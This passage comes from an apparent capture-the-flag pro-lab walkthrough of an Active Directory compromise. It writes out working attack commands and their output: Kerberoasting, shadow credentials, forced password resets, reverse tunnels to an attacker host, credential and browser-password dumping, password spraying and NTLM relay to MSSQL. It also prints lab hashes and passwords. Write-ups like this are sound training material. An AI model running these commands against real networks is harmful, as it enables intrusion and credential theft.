LDAP        192.168.210.10  389    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 (name:ZPH-SVRDC01) (domain:zsm.local)
LDAP        192.168.210.10  389    ZPH-SVRDC01      [+] zsm.local\jamie:P@ass123
LDAP        192.168.210.10  389    ZPH-SVRDC01      No entries found!

```

Kerberoast:

```bash
nxc ldap zsm.local -u jamie -p 'P@ass123' --kerberoast zsm_kerberoast.out#

$krb5tgs$18$ZPH-GMSA-ADFS$$ZSM.LOCAL$*zsm.local\ZPH-GMSA-ADFS$*$722bf937c487991023025a01$da9b18fee2b9568010b790d9f2ae99da4eb6b478870b93ae5bbf11f4952076d1ce91b10749df7ef6f1868cf65eaf354a1e84e10647b869ca9a7f7d67ca92e2e91fcb1c2661cd7dea1ecee5fccd8114cccf79e541608111759a0cce8d0f7ef66eddd1f0bb3d62dc9a5fbdcae3899af2e962416b5c16e3e5ec88bfa80fb507aef90349b9a81d5d1d12613156a81165cc9f9a42582ae95cf32a5bd62827bbe557d861fe5618f5d49f77c41cf5fb03ec8a8dee218d817a21d66b764cd11775d2d4d3f319df2b0036773cb44d90b42a4f981544a1162422f191b2cc6b50634917f7a2f89b6e6e52c7430746db2b0b5b63d3a9cb9591e02425608a425f46eb01ce67f6edd27ff816b3377d9c469f3a847f3c8aa749ffe661b9fe22773fc604cab535a9c0c01f4a688a7209998861f7aebe756e18ce9c11d8a531b66b61a3294c2414efa0a40d42e8fe9dfd7c8704f4fb9db848978b66200ca7603e51e9e6b659305082dedbf71c1fc4087076e4a97654192352078874e5335d2ce94e0e53eebf8dc31519aa8c1139b801a487dac158ea23ac70c7134b7bcdc93c8b705f0f9465f68948ebdfdce5c57fd6c8ebb44b99f411ef768d26a10d2f1aea7f293e9f5daaeac1215ab41f1b0eee2e8653ac55fc34ed4b00deb30a0ec3cb9bb18832f521a2db7c57cffd0ae6f6c902421c3823d06732ee865097013521ef757e98444855495ecf24a7e1d2d2177cf1d06c8674ae99e756b904d8dde6398902e884850a81074637e95373107ec8d7e6c843da3f4208add1a973454e42354a76d5d6b46f42ba3688f0011605c6957154c9dbad3c45c44eb5bce8f14566779340825135b8c8c885980737c9a67c77147928eea41ab6d481cf43cf1193aa7b544d7d1f9372883bcaffe80806dec88e5459de1fc3ca39280d369463c015e459597292ee23b0bcf42fae4427cb1ac1ce343a26f561fbc59bf158e3405e7a6943024da2be8edce6671c30a49dae1504f4f18c28ae2bc0e7cd314415698a3e18cc009795b7e69ca7b0f725873ad2588904b768d54c01a073023b1e5f55873acd631b98aa5d85b2323058206487cf1c7fe277dea8f64de95958490f606c16daff7679464128c08e89aeb4e9dc80b7e755baab5d1cd5bf8012025291bfa31389f0eb61a3c0726a884bdc6983758a654fb24b37f4059d509bfac5f4085305a1764d923872a17a43e465007933b8a8772ce86a4969eb5b62592fdaa33d995546c5b693eff35aa844308a8f1fd35f19d0b4ad7f90e729a1d7288427879447faeb74a612a1621acf4b05347e596490e8cd1a1acf734fd22f06953def3a50c1e38a7e48ca47943b9b7a739fed01b07fb5cf5de58c04bf4523a7e30cd3616a49c7a0e7328ea047193c5bab02f6a68d8abb1a6f7bb8c0833a3264155f34823cb5eea77c7fdfa9eae204d71b6c1f3e245d205bb0b9745f827ed751b144f64af07321ff1b9063c5ddc65dac999f1e525c

```

Searching up $krb5tgs$18 in https://hashcat.net/wiki/doku.php?id=example_hashes reveal the hash to be Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96). 

```bash
.\hashcat.exe -m 19700 ..\hashes.txt ..\rockyou.txt
```

Did not work. Formatting seems weird. Let’s try targetedKerberoast:

```bash
┌──(kali㉿kali)-[~/pro-labs/zephyr]
└─$ python3 /home/kali/tools/targetedKerberoast.py -v -d 'zsm.local' -u marcus -p '!QAZ2wsx' --request-user ZPH-GMSA-ADFS$
[*] Starting kerberoast attacks
[*] Attacking user (ZPH-GMSA-ADFS$)
                                                                                                                                               
┌──(kali㉿kali)-[~/pro-labs/zephyr]
└─$ python3 /home/kali/tools/targetedKerberoast.py -v -d 'zsm.local' -u marcus -p '!QAZ2wsx' --request-user 'ZPH-GMSA-ADFS$@ZSM.LOCAL'
[*] Starting kerberoast attacks
[*] Attacking user (ZPH-GMSA-ADFS$@ZSM.LOCAL)

```

No result…

Let’s map out the AD with rusthound:

```bash
rusthound-ce -u marcus -p '!QAZ2wsx' -d zsm.local
```

Checking our user’s privileges:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2050.png)

We are part of the zabbix management group.

![image.png]({{ site.baseurl }}/assets/zephyr/image%2051.png)

We can AddKeyCredentialLink to SVRMGMT1.

That means we can create shadow credentials and get SVRMGMT1’s NTLM hash.

SVRMGMT1’s privilege:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2052.png)

The computer is part of general management, which has forceChangePassword on Jamie:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2053.png)

Who can add themself to CA Managers:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2054.png)

First, let’s get the NTLM of SVRMGMT1$:

```bash
sudo ntpdate 192.168.210.10

certipy-ad shadow auto -u marcus@zsm.local -p '!QAZ2wsx' -account ZPH-SVRMGMT1$ -dc-ip 192.168.210.10

[*] Targeting user 'ZPH-SVRMGMT1$'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '8c82bb6c95a5405d9b183f21ac17bd3a'
[*] Adding Key Credential with device ID '8c82bb6c95a5405d9b183f21ac17bd3a' to the Key Credentials for 'ZPH-SVRMGMT1$'
[*] Successfully added Key Credential with device ID '8c82bb6c95a5405d9b183f21ac17bd3a' to the Key Credentials for 'ZPH-SVRMGMT1$'
[*] Authenticating as 'ZPH-SVRMGMT1$' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'zph-svrmgmt1$@zsm.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'zph-svrmgmt1.ccache'
[*] Wrote credential cache to 'zph-svrmgmt1.ccache'
[*] Trying to retrieve NT hash for 'zph-svrmgmt1$'
[*] Restoring the old Key Credentials for 'ZPH-SVRMGMT1$'
[*] Successfully restored the old Key Credentials for 'ZPH-SVRMGMT1$'
[*] NT hash for 'ZPH-SVRMGMT1$': 89d0b56874f61ad38bad336a77b8ef2f

```

Let’s verify:

```bash
nxc smb zsm.local -u ZPH-SVRMGMT1$ -H 89d0b56874f61ad38bad336a77b8ef2f --shares

SMB         192.168.210.10  445    ZPH-SVRDC01      [+] zsm.local\ZPH-SVRMGMT1$:89d0b56874f61ad38bad336a77b8ef2f 
```

Now let’s add ourself to General Management Group

```bash
bloodyAD -u ZPH-SVRMGMT1$ -p :89d0b56874f61ad38bad336a77b8ef2f -d zsm.local --host 192.168.210.10 add groupMember 'General Management' ZPH-SVRMGMT1$

[+] ZPH-SVRMGMT1$ added to General Management
```

Now let’s force change jamie’s password:

```bash
bloodyAD -u ZPH-SVRMGMT1$ -p :89d0b56874f61ad38bad336a77b8ef2f -d zsm.local --host 192.168.210.10 set password jamie 'P@ass123'

[+] Password changed successfully!
```

Now let’s add ourselves to CA Manager:

```bash
bloodyAD -u jamie -p 'P@ass123' -d zsm.local --host 192.168.210.10 add groupMember 'CA Managers' jamie

[+] jamie added to CA Managers
```

Now let’s find vulnerable certs:

```bash
certipy-ad find -u jamie@zsm.local -p 'P@ass123' -dc-ip 192.168.210.10 -stdout -vuln

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'zsm-ZPH-SVRCA01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'zsm-ZPH-SVRCA01-CA'
[*] Checking web enrollment for CA 'zsm-ZPH-SVRCA01-CA' @ 'ZPH-SVRCA01.zsm.local'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : zsm-ZPH-SVRCA01-CA
    DNS Name                            : ZPH-SVRCA01.zsm.local
    Certificate Subject                 : CN=zsm-ZPH-SVRCA01-CA, DC=zsm, DC=local
    Certificate Serial Number           : 1BF5EE45154494AD45D2CF5E6C8BA0A0
    Certificate Validity Start          : 2022-03-16 16:35:15+00:00
    Certificate Validity End            : 2042-03-16 16:45:14+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : ZSM.LOCAL\Administrators
      Access Rights
        ManageCa                        : ZSM.LOCAL\Administrators
                                          ZSM.LOCAL\Domain Admins
                                          ZSM.LOCAL\Enterprise Admins
        ManageCertificates              : ZSM.LOCAL\Administrators
                                          ZSM.LOCAL\Domain Admins
                                          ZSM.LOCAL\Enterprise Admins
        Enroll                          : ZSM.LOCAL\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates

```

There are none. From our enumeration, we know 192.168.210.12 is CA server. Let’s try authentication there. Exploit continues on CA. 

## 192.168.210.12 ZPH-SVRCA01

```bash
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: ZPH-SVRCA01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:ea:63 (VMware)
| smb2-time: 
|   date: 2025-11-18T18:00:52
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```

Let’s find the hostname:

```bash
nxc smb 192.168.210.12 -u '' -p ''

SMB         192.168.210.12  445    ZPH-SVRCA01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCA01) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.12  445    ZPH-SVRCA01      [-] zsm.local\: STATUS_ACCESS_DENIED 
```

We got jamie’s password from SRVDC01. 

```bash
nxc smb 192.168.210.12 -u jamie -p 'P@ass123'
```

Let’s change pivot route from Zabbix server instead.

We got to change our pivot structure. We need dynamic port forwarding through DC. Let’s upload chisel onto DC.

We can download chiel from here: https://github.com/jpillora/chisel/releases

Let’s download the latest versions.

After extracting it, let’s start the server; we need it on a port that’s reachable, we can do port 445:

```bash
./chisel server -p 445 -reverse -v
```

On the DC (192.168.110.55):

```bash
upload chisel.exe

#.\chisel.exe client 10.10.16.5:445 R:socks 

./chisel client 10.10.16.5:445 R:81:192.168.210.13:443 

```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2055.png)

Now we get the shell again 

We also need to login to zabbix:

```bash
python3 cve-2022-23131.py https://localhost:81/ 
```

Follow the steps back in Zabbix Server. 

After we get shell, we need to upload ligolo agent.

```bash
#on localhost
python3 -m http.server 443

#on target Zabbix Server shell
wget http://10.10.16.5:443/agent

chmod +x agent
```

Now let’s connect back to our server:

```bash
./agent -connect 10.10.16.5:80 -ignore-cert

#back on proxy session
session
start --tun ligolo-d
```

Now let’s scan ZPH-SVRCA01 again:

```bash
sudo nmap -sC -sV 192.168.210.12 -oN nmap/ZPH-SVRCA01

80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We got one more port, 5985. 

After following our steps from SRVDC01, adding jamie to the group of CA Managers, we try jamie’s credential again:

```bash
nxc winrm 192.168.210.12 -u jamie -p 'P@ass123'

WINRM       192.168.210.12  5985   ZPH-SVRCA01      [+] zsm.local\jamie:P@ass123 (Pwn3d!)
```

We have winrm privilege. Let’s login:

```bash
evil-winrm -u jamie -p 'P@ass123' -i 192.168.210.12 
```

Success. We find the flag in Public Desktop.

Let’s check this computer’s (ZPH-SVRCA01) privilege:

![image.png]({{ site.baseurl }}/assets/zephyr/image%2056.png)

![image.png]({{ site.baseurl }}/assets/zephyr/image%2057.png)

```bash
nxc winrm 192.168.210.12 -u jamie -p 'P@ass123' --sam
```

Let’s check our group’s permission:

```bash
Get-ADGroupMember -Identity "CA MANAGERS" -Recursive | Get-ADPermission
```

But nothing more. Let’s password spray and see what other computer we can get on:

```bash
nxc winrm 192.168.210.0/24 -u jamie -p 'P@ass123'

WINRM       192.168.210.11  5985   ZPH-SVRMGMT1     [+] zsm.local\jamie:P@ass123 (Pwn3d!)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       192.168.210.12  5985   ZPH-SVRCA01      [+] zsm.local\jamie:P@ass123 (Pwn3d!)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.

nxc winrm 192.168.210.0/24 -u marcus -p '!QAZ2wsx'
```

Let’s logon to SVRMGMT1. Exploitation steps are there.

## 192.168.210.11 ZPH-SVRMGMT1

```bash
Nmap scan report for ZPH-SVRMGMT1 (192.168.210.11)                                                                                             
Host is up (0.0036s latency).                                                                                                                  
Not shown: 998 filtered tcp ports (no-response)                                                                                                
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                               
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 
```

We have marcus’ credential.

```bash
└─$ nxc smb 192.168.210.11 -u marcus -p '!QAZ2wsx' --shares --local-auth
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRMGMT1) (domain:ZPH-SVRMGMT1) (signing:False) (SMBv1:False)
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [-] ZPH-SVRMGMT1\marcus:!QAZ2wsx STATUS_LOGON_FAILURE 
                                                                                                                                               
┌──(kali㉿kali)-[~/pro-labs/zephyr]
└─$ nxc smb 192.168.210.11 -u ZPH-SVRMGMT1$ -H 89d0b56874f61ad38bad336a77b8ef2f --shares 
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRMGMT1) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [+] zsm.local\ZPH-SVRMGMT1$:89d0b56874f61ad38bad336a77b8ef2f 
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [*] Enumerated shares
SMB         192.168.210.11  445    ZPH-SVRMGMT1     Share           Permissions     Remark
SMB         192.168.210.11  445    ZPH-SVRMGMT1     -----           -----------     ------
SMB         192.168.210.11  445    ZPH-SVRMGMT1     ADMIN$                          Remote Admin
SMB         192.168.210.11  445    ZPH-SVRMGMT1     C$                              Default share
SMB         192.168.210.11  445    ZPH-SVRMGMT1     IPC$            READ            Remote IPC

```

We got jamie’s credential:

```bash
nxc winrm 192.168.210.11 -u jamie -p 'P@ass123'

evil-winrm -i 192.168.210.11 -u jamie -p 'P@ass123'
```

Checking our pivilege on the machine, we are local administrator:

```bash
whoami /groups
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2058.png)

Let’s dump all hashes:

```bash
nxc winrm 192.168.210.11 -u jamie -p 'P@ass123' --sam --lsa

WINRM       192.168.210.11  5985   ZPH-SVRMGMT1     
Administrator:500:aad3b435b51404eeaad3b435b51404ee:545c503123664e5713439e088bd91035:::

WINRM       192.168.210.11  5985   ZPH-SVRMGMT1     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINRM       192.168.210.11  5985   ZPH-SVRMGMT1     DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WINRM       192.168.210.11  5985   ZPH-SVRMGMT1     WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:68a58eed2cff6a92dd8d2d5b9116be4f:::
WINRM       192.168.210.11  5985   ZPH-SVRMGMT1     ZSM.LOCAL/Administrator:$DCC2$10240#Administrator#04a13c983d1c6f2ee43cc9aa0c4d49c6: (2024-12-12 12:54:22+00:00)
WINRM       192.168.210.11  5985   ZPH-SVRMGMT1     ZSM.LOCAL/marcus:$DCC2$10240#marcus#66dddfc25df0d824e30c55a9ecccb512: (2025-11-15 03:07:51+00:00)
WINRM       192.168.210.11  5985   ZPH-SVRMGMT1     ZSM.LOCAL/jamie:$DCC2$10240#jamie#8eaa1e87b84f7197df2b836fae8e5c3c: (2022-10-28 12:56:42+00:00)
WINRM       192.168.210.11  5985   ZPH-SVRMGMT1     $MACHINE.ACC:plain_password_hex:a59ff2202125f08774455a23ac8e623130743053e98d29eea3234cf4995bc3040b3e86e68c4ce7d681da4614f3b4d6066ce96a1a0257a1dca1221f864fcaf05f617d53ff9e6e7e8afedf8e4e70dd793440a6203fc780bbae017e795f3002958340850257b1caff49bcb045a861c67631dfb7f0ac6525ec72a9fd35035bfa1cb79578a785c08140a10abe5b756c2bcaa06ae1dceb3fe0f315a793c66aeaf35558deafd3d3796674de82fb98ba41878356fdde5ab8fc89dfe8a67c34015d64f03f52d515684b07c1bc9108daa73c6a63f49bf32e6403f850ae7d56ca6f2c49ca82fe414f14c100a2fb7cc901a2f07c52dc
WINRM       192.168.210.11  5985   ZPH-SVRMGMT1     $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:89d0b56874f61ad38bad336a77b8ef2f
WINRM       192.168.210.11  5985   ZPH-SVRMGMT1     dpapi_machinekey:0x05341d094f374bb97fd82b3a19619bbc3d28e967
dpapi_userkey:0xc4de07634653cdeda95b1baea5a86ceaa9683003
WINRM       192.168.210.11  5985   ZPH-SVRMGMT1     NL$KM:95e838f2478a4112a577ca0a23e6562885567310a949996ab55dfbc5adb44c763a07d84073edee03285ea6027e0938ea48557f6d9cfd9a8bc1f1f4d70a6f3bd0

```

Let’s password spray the machine account password:

```bash
nxc winrm 192.168.210.0/24 -u Administrator -H 545c503123664e5713439e088bd91035 --local-auth
```

None.

```bash
evil-winrm -u Administrator -H 545c503123664e5713439e088bd91035 -i 192.168.210.11
```

Uploading LaZagne.exe on to the host:

```bash
.\LaZagne.exe all

[+] 0 passwords have been found.
```

We see Chrome in Program Files. Maybe there are stored passwords in DPAPI?

We need to upload SharpChromium. Did not work:

```bash
.\SharpChromium.exe 

[*] Beginning Edge extraction.

SharpChromium.exe : 
    + CategoryInfo          : NotSpecified: (:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Unhandled Exception: System.Security.Cryptography.CryptographicException: Key not valid for use in specified state.   at System.Security.Cryptography.ProtectedData.Unprotect(Byte[] encryptedData, Byte[] optionalEntropy, DataProtectionScope scope)   at SharpChromium.ChromiumCredentialManager.DecryptBase64StateKey(String base64Key)   at SharpChromium.ChromiumCredentialManager..ctor(String basePath, String[] domains)   at SharpChromium.Program.ExtractData(String path, String browser)   at SharpChromium.Program.Main(String[] args)
```

Let’s try SharpChrome.exe:

```bash
.\SharpChrome.exe logins

[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user

SharpChrome completed in 00:00:00.0147864
```

Did not work either. 

Let’s try executing it with marcus’ account:

```bash
evil-winrm  -u marcus -p '!QAZ2wsx' -i 192.168.210.11 

.\Sharpchrome.exe logins

[*] Action: Chrome Saved Logins Triage

[*] Triaging Chrome Logins for current user

[*] AES state key file : C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key      : F9161E380A7FBF9C67262674A2B7AC6AE1EE726213DD5A3B0FE6E45D34955996

---  Credential (Path: C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://zephyr.atlassian.htb/,https://zephyr.atlassian.htb/,08/11/2022 06:09:21,13312390161509701,melissa,WinterIsHere2022!

```

Searching up melissa in bloodhound, she is not a domain user. 

Let’s get the password policy before we password spray:

```bash
nxc smb 192.168.210.10 -u marcus -p '!QAZ2wsx' --pass-pol

SMB         192.168.210.10  445    ZPH-SVRDC01      [+] zsm.local\marcus:!QAZ2wsx 
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] Dumping password info for domain: ZSM
SMB         192.168.210.10  445    ZPH-SVRDC01      Minimum password length: 7
SMB         192.168.210.10  445    ZPH-SVRDC01      Password history length: 24
SMB         192.168.210.10  445    ZPH-SVRDC01      Maximum password age: 41 days 23 hours 53 minutes 
SMB         192.168.210.10  445    ZPH-SVRDC01      
SMB         192.168.210.10  445    ZPH-SVRDC01      Password Complexity Flags: 000001
SMB         192.168.210.10  445    ZPH-SVRDC01          Domain Refuse Password Change: 0
SMB         192.168.210.10  445    ZPH-SVRDC01          Domain Password Store Cleartext: 0
SMB         192.168.210.10  445    ZPH-SVRDC01          Domain Password Lockout Admins: 0
SMB         192.168.210.10  445    ZPH-SVRDC01          Domain Password No Clear Change: 0
SMB         192.168.210.10  445    ZPH-SVRDC01          Domain Password No Anon Change: 0
SMB         192.168.210.10  445    ZPH-SVRDC01          Domain Password Complex: 1
SMB         192.168.210.10  445    ZPH-SVRDC01      
SMB         192.168.210.10  445    ZPH-SVRDC01      Minimum password age: 1 day 4 minutes 
SMB         192.168.210.10  445    ZPH-SVRDC01      Reset Account Lockout Counter: 30 minutes 
SMB         192.168.210.10  445    ZPH-SVRDC01      Locked Account Duration: 30 minutes 
SMB         192.168.210.10  445    ZPH-SVRDC01      Account Lockout Threshold: None
SMB         192.168.210.10  445    ZPH-SVRDC01      Forced Log off Time: Not Set
```

This mean there is no lockout policy. Let’s password spray:

```bash
nxc smb 192.168.210.0/24 -u melissa -p 'WinterIsHere2022!' --local-auth

nxc mssql 192.168.210.0/24 -u melissa -p 'WinterIsHere2022!' --continue-on-success

MSSQL       192.168.210.19  1433   ZSM-SVRCSQL02    [+] internal.zsm.local\melissa:WinterIsHere2022! 
```

Let’s add the new domain to our /etc/hosts:

```bash
192.168.210.19  ZSM-SVRCSQL02.internal.zsm.local
```

Exploitation steps continued on ZSM-SVRCSQL02.

## 192.168.210.15 ZPH-SVRSQL01

```bash
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2130.00; GDR1+
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-18T07:29:20
|_Not valid after:  2055-11-18T07:29:20
|_ssl-date: 2025-11-18T12:50:28+00:00; +4s from scanner time.
| ms-sql-ntlm-info:
|   192.168.210.15:1433:
|     Target_Name: ZSM
|     NetBIOS_Domain_Name: ZSM
|     NetBIOS_Computer_Name: ZPH-SVRSQL01
|     DNS_Domain_Name: zsm.local
|     DNS_Computer_Name: ZPH-SVRSQL01.zsm.local
|     DNS_Tree_Name: zsm.local
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   192.168.210.15:1433:
|     Version:
|       name: Microsoft SQL Server 2019 GDR1+
|       number: 15.00.2130.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: GDR1
|       Post-SP patches applied: true
|_    TCP port: 1433
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Let’s find out if the host is vulnerable to NTLM relay:

```bash
nxc smb 192.168.210.15 -u marcus -p '!QAZ2wsx'

SMB         192.168.210.15  445    ZPH-SVRSQL01     [*] Windows 10 / Server 2019 Build 17763 x64 (name:ZPH-SVRSQL01) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.15  445    ZPH-SVRSQL01     [+] zsm.local\marcus:!QAZ2wsx

```

Signing false. 

Let’s get a file containing all machine with signing as false:

```bash
nxc smb 192.168.210.0/24 --gen-relay-list relay.txt

SMB         192.168.210.15  445    ZPH-SVRSQL01     [*] Windows 10 / Server 2019 Build 17763 x64 (name:ZPH-SVRSQL01) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:False)
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRMGMT1) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.12  445    ZPH-SVRCA01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCA01) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.14  445    ZPH-SVRADFS1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRADFS1) (domain:zsm.local) (signing:False) (SMBv1:False)
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:False)
```

relay.txt:

```bash
192.168.210.15
192.168.210.11
192.168.210.12
192.168.210.14
```

Now let’s attempt to relay:

```bash
impacket-ntlmrelayx -t mssql://192.168.210.15:1433 -smb2support -i
```

From SQL server:

```bash
EXEC master..xp_dirtree '\\10.10.16.5\share\'
```

Now on our relay terminal:

```bash
[*] Servers started, waiting for connections
^[[B[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.10.110.35, attacking target mssql://192.168.210.15:1433
[*] Authenticating against mssql://192.168.210.15:1433 as INTERNAL/MSSQL_SVC SUCCEED
[*] Started interactive MSSQL shell via TCP on 127.0.0.1:11000
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.10.110.35, attacking target mssql://192.168.210.15:1433
[*] Authenticating against mssql://192.168.210.15:1433 as INTERNAL/MSSQL_SVC SUCCEED
[*] Started interactive MSSQL shell via TCP on 127.0.0.1:11001
[*] SMBD-Thread-9 (process_request_thread): Received connection from 10.10.110.35, attacking target mssql://192.168.210.15:1433
[*] Authenticating against mssql://192.168.210.15:1433 as INTERNAL/MSSQL_SVC SUCCEED
[*] Started interactive MSSQL shell via TCP on 127.0.0.1:11002
[*] SMBD-Thread-11 (process_request_thread): Received connection from 10.10.110.35, attacking target mssql://192.168.210.15:1433
[-] ERROR(ZPH-SVRSQL01): Line 1: Login failed for user 'NT AUTHORITY\ANONYMOUS LOGON'.

```

Now let’s nc connect to port 11000:

```bash
nc localhost 11000
```

![image.png]({{ site.baseurl }}/assets/zephyr/image%2059.png)

```bash
SELECT name FROM master.dbo.sysdatabases

SQL (internal\mssql_svc  guest@master)> SELECT name FROM master.dbo.sysdatabases

name           
------------   
master         

tempdb         

model          

msdb           

zabbix_hosts   

SQL (internal\mssql_svc  guest@master)> SQL (internal\mssql_svc  guest@master)> SELECT srvname, isremote FROM sysservers
srvname        isremote   
------------   --------   
ZPH-SVRSQL01          1   

SQL (internal\mssql_svc  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin')
    
-   
0   

SQL (internal\mssql_svc  guest@master)> enable_xp_cmdshell
ERROR(ZPH-SVRSQL01): Line 105: User does not have permission to perform this action.
ERROR(ZPH-SVRSQL01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(ZPH-SVRSQL01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(ZPH-SVRSQL01): Line 1: You do not have permission to run the RECONFIGURE statement.

```

We know there is a SQL server on 192.168.210.15. Let’s try and connect:

```bash
nxc mssql 192.168.210.15 -u zabbix -p rDhHbBEfh35sMbkY --local-auth

MSSQL       192.168.210.15  1433   ZPH-SVRSQL01     [*] Windows 10 / Server 2019 Build 17763 (name:ZPH-SVRSQL01) (domain:zsm.local)
MSSQL       192.168.210.15  1433   ZPH-SVRSQL01     [+] ZPH-SVRSQL01\zabbix:rDhHbBEfh35sMbkY
```

```bash
impacket-mssqlclient zabbix@192.168.210.15
 
SELECT name FROM master.dbo.sysdatabases

#Selecting a DB
USE zabbix_hosts

#Show tables
SELECT table_name FROM zabbix_hosts.INFORMATION_SCHEMA.TABLES

table_name   
----------   
hosts 

#Select all Data from Table "hosts"
SELECT * FROM hosts

id   hostname                             ip_address          network_name         
--   ----------------------------------   -----------------   ------------------   
